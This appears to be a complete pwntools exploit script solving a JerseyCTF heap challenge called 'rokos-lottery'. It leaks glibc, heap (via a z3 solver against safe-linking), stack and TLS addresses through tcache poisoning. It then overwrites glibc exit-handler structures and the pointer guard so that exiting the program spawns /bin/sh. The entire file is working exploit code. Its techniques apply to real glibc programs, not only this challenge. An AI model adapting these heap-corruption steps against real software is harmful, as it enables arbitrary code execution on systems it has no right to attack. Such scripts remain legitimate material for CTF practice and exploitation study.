from pwn import *
from z3 import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./lottery_patched', '''
    b *(main+403)
    b *(main+470)
    b *(main+700)
    b *(main+1040)
    b *(main+1090)
    b *(main+1466)
    continue
''')

# p = remote('rokos-lottery.aws.jerseyctf.com', 5000)

def attempt_ticket(size):
    p.sendlineafter(b'Enter your lucky number: ', b'1')
    p.sendlineafter(b'Enter your lucky number: ', str(size).encode())

def use_technique(technique):
    p.sendlineafter(b'Enter your lucky number: ', b'2')
    p.sendlineafter(b'Enter your lucky number: ', str(technique).encode())

def burn_tickets(number, signatures, signs):
    p.sendlineafter(b'Enter your lucky number: ', b'3')
    signatures_output = []
    for i in range(number):
        if signs[i]:
            p.sendlineafter(b'sign it before you discard? ', b'y')
            p.recvuntil(b'Sign your ticket before it flies away: ')
            p.send(signatures[i])
            p.recvuntil(b'You sign ')
            signatures_output.append(p.recvuntil(b' as the ticket flies away...\n', drop=True))
        else:
            p.sendlineafter(b'sign it before you discard? ', b'n')
            signatures_output.append(b'NULL')
    return signatures_output

def discard_ticket():
    p.sendlineafter(b'Enter your lucky number: ', b'4')

def scratch_ticket(name, jackpot=True, trip=False):
    p.sendlineafter(b'Enter your lucky number: ', b'5')
    if jackpot and not trip:
        p.recvuntil(b'Your earnings:\n')
        earnings = []
        for _ in range(5):
            earnings.append(p.recvline().strip())
        return earnings
    elif trip and not jackpot:
        p.recvuntil(b'Please sign your name here: ')
        p.send(name)

def give_up():
    p.sendlineafter(b'Enter your lucky number: ', b'6')

# Stage 1: Get glibc base address
p.recvuntil(b'Here is last week\'s winning lottery number: ')
glibc_base_addr = int(p.recvline().strip().decode())-0x8cb30
log.info(f'glibc base address: {hex(glibc_base_addr)}')

# Stage 2: Set up seed for rng
p.sendlineafter(b'Enter your lucky number: ', str(647389).encode())

# Stage 3: Leak heap base address
attempt_ticket(0x18)
attempt_ticket(0x18)
heap_leaks = burn_tickets(2, [b'A', b'A'], signs=[True, True])
heap_base = BitVec('heap_base', 64)
s = Solver()
s.add((heap_base+0x2c0>>12)>>8==u64(heap_leaks[0].ljust(8, b'\x00'))>>8)
s.add(((heap_base+0x2e0>>12)^(heap_base+0x2c0))>>8==u64(heap_leaks[1].ljust(8, b'\x00'))>>8)
s.check()
heap_base_addr = s.model()[heap_base].as_long()
log.info(f'heap base address: {hex(heap_base_addr)}')

# Stage 4: Leak rsp register value
attempt_ticket(0x28)
attempt_ticket(0x28)
glibc_e = ELF('./libc.so.6')
burn_tickets(2, [p64(((heap_base_addr+0x300)>>12)^0), p64(((heap_base_addr+0x330)>>12)^(glibc_base_addr+glibc_e.symbols.environ+0x8))], signs=[True, True])
attempt_ticket(0x28)
attempt_ticket(0x28)
environ_leaks = scratch_ticket(b'', jackpot=True, trip=False)
rsp_value = int(environ_leaks[1].split(b'$')[1].decode())-0x248
log.info(f'rsp value: {hex(rsp_value)}')

# Stage 5: Leak tls base address
attempt_ticket(0x28)
burn_tickets(2, [p64(((heap_base_addr+0x330)>>12)^0), p64(((heap_base_addr+0x360)>>12)^(rsp_value-0x20))], signs=[True, True])
attempt_ticket(0x28)
discard_ticket()
attempt_ticket(0x28)
tls_leaks = scratch_ticket(b'', jackpot=True, trip=False)
tls_base_addr = int(tls_leaks[3].split(b'$')[1].decode())-0x3e8c0
log.info(f'tls base address: {hex(tls_base_addr)}')

# Stage 6: Attack exit functions
attempt_ticket(0x38)
attempt_ticket(0x38)
attempt_ticket(0x48)
attempt_ticket(0x48)
burn_tickets(4, [p64(((heap_base_addr+0x390)>>12)^0), p64(((heap_base_addr+0x3d0)>>12)^(tls_base_addr+0x30)), p64(((heap_base_addr+0x410)>>12)^0), p64(((heap_base_addr+0x460)>>12)^(glibc_base_addr+0x212fd0))], signs=[True, True, True, True])
attempt_ticket(0x38)
attempt_ticket(0x38)
scratch_ticket(p64(0), jackpot=False, trip=True)
attempt_ticket(0x48)
attempt_ticket(0x48)
scratch_ticket(p64(0x4)+p64((glibc_base_addr+glibc_e.symbols.system)<<0x11)+p64(glibc_base_addr+next(glibc_e.search(b"/bin/sh"))), jackpot=False, trip=True)

# Stage 7: Trigger exit functions
give_up()

p.interactive()

# jctfv{}